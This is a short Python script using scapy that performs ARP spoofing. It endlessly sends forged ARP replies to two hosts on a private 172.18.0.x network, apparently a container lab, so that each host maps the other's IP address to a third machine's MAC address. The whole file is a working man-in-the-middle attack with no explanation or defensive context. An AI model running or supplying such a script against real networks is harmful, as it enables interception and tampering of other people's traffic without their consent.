from scapy.all import *

def arp_spoofing(dst_mac, dst_ip, src_mac, src_ip):
    arp_packet = Ether(dst=dst_mac)/ARP(op=2, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip)
    sendp(arp_packet, verbose=False)

while True:
    arp_spoofing("02:42:ac:12:00:02", "172.18.0.2", "02:42:ac:12:00:03", "172.18.0.4")
    arp_spoofing("02:42:ac:12:00:04", "172.18.0.4", "02:42:ac:12:00:03", "172.18.0.2")
